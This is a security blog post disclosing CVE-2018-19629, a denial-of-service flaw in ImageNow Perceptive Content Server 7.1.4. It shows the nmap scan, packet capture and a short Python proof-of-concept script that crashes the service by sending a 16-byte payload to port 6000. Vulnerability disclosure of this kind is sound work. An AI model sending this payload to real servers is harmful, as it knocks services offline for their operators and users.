=== Content from www.oppositionsecurity.com_903d1616_20250125_123703.html ===


[To Top](#top)[Scroll Down](#scroll-down)

* [Home](../index.html#home)
* [Services](../index.html#services)
* [Process](../index.html#process)
* [Team](../index.html#team)
* [Skills](../index.html#skills)
* [Blog](../blog/index.html)
* [Contact](../index.html#contact)

### [OPPOSITION SECURITY](../index.html)

Close

* [Home](../index.html#home)
* [Services](../index.html#services)
* [Process](../index.html#process)
* [Team](../index.html#team)
* [Skills](../index.html#skills)
* [Blog](../blog/index.html)
* [Contact](../index.html#contact)

 ![](../wp-content/uploads/2018/11/bg-picjumbo.com_IMG_7432.jpg)
![](../wp-content/uploads/2018/11/bg-picjumbo.com_IMG_7432.jpg)
[15
Jul 2019](index.html)
 [vosec](../author/vosec/index.html "View all posts by vosec")
 [No Comments](#respond)
 [Exploit Development](../category/exploit-development/index.html "View all posts in Exploit Development")  [Permalink](index.html)

# ImageNow Perceptive Content Server 7.1.4 DoS

Back in November, while doing some vulnerability scans against an internal network, we received a report our scans were causing an application called ImageNow to crash. We were able to replicate this crash using the vulnerability scanner consistently so we decided to investigate further.

Our first step was to see if we could identify what the vulnerability scanner was doing at the exact moment the crash occurred. Looking at the scan logs the action was pretty easily identified as simply a port scan against all TCP ports.

Since the logs did not tell us which port was scanned at crash time, the next step was to try a similar scan using NMAP (the -sV is key): `nmap -p 1-65535 -sT -sV 10.1.4.89`

After a couple minutes the service crashed just as before. Now let’s try again while doing a packet capture. Watching the packet capture we saw most traffic had no issues but a couple minutes in we were able to identify some resets while communicating with port 6000.

[![](../wp-content/uploads/2019/07/ImageNow-Packet-Capture-600x63.png)](../wp-content/uploads/2019/07/ImageNow-Packet-Capture.png)

Examining the TCP stream shows the last thing we sent before the reset:

ASCII: `TNMP....TNME....`

Hex: `54 4e 4d 50 04 00 00 00 54 4e 4d 45 00 00 04 00`

Now we know what caused the crash. We should be able to replicate the TCP stream directly in a quick python script:

```
import socket

ip = "10.1.4.89"
port = 6000

crash = "\x54\x4e\x4d\x50\x04\x00\x00\x00\x54\x4e\x4d\x45\x00\x00\x04\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(crash)
s.close()
```

With the proof of concept, we can run the python script and immediately and consistently crash the service.

This issue was reported to ImageNow \ Hyland in November 2018. After months of discussion, Hyland support notified us version 7.1.4 was end of life in 2016 and they could no longer update the code base to provide a patch. The vulnerability was tested against 7.1.5 and has been resolved in 7.1.5 and later.

This vulnerability is covered by [CVE-2018-19629](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19629).

### Leave a Reply [Cancel reply](#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Current [[email protected]](../cdn-cgi/l/email-protection.html) \*

Leave this field empty

Search for:

##### Recent Posts

* [McKesson Cardiology 13.x and 14.x Improper Permissions Local Privilege Escalation](../mckesson-cardiology-13-x-and-14-x-improper-permissions-local-privilege-escalation/index.html)
* [ImageNow Perceptive Content Server 7.1.4 DoS](index.html)
* [Advanced Windows Exploitation 2018 Review](../advanced-windows-exploitation-2018-review/index.html)
##### Categories

* [Certifications](../category/certifications/index.html) (7)
* [Exploit Development](../category/exploit-development/index.html) (4)
* [Research](../category/research/index.html) (1)
* [Training](../category/training/index.html) (1)
##### Tags

[Antivirus](../tag/antivirus/index.html)
[Assembly](../tag/assembly/index.html)
[AV](../tag/av/index.html)
[AWE](../tag/awe/index.html)
[Blackhat](../tag/blackhat/index.html)
[Buffer Overflow](../tag/buffer-overflow/index.html)
[CVE-2018-18360](../tag/cve-2018-18360/index.html)
[CVE-2018-19629](../tag/cve-2018-19629/index.html)
[Egghunter](../tag/egghunter/index.html)
[Exploit](../tag/exploit/index.html)
[Exploit-DB](../tag/exploit-db/index.html)
[Fuzzing](../tag/fuzzing/index.html)
[Next-Gen](../tag/next-gen/index.html)
[Offensive Security](../tag/offensive-security/index.html)
[Offsec](../tag/offsec/index.html)
[OSEE](../tag/osee/index.html)
[RCE](../tag/rce/index.html)
[Review](../tag/review/index.html)
[SEH](../tag/seh/index.html)
[SLAE x86](../tag/slae-x86/index.html)
[SQLi](../tag/sqli/index.html)
[Web Application](../tag/web-application/index.html)

November 2022
| M | T | W | T | F | S | S |
| --- | --- | --- | --- | --- | --- | --- |
|  | 1 | 2 | 3 | 4 | 5 | 6 |
| 7 | 8 | 9 | 10 | 11 | 12 | 13 |
| 14 | 15 | 16 | 17 | 18 | 19 | 20 |
| 21 | 22 | 23 | 24 | 25 | 26 | 27 |
| 28 | 29 | 30 |  | | | |

[« Sep](../2019/09/index.html)

© Opposition Security


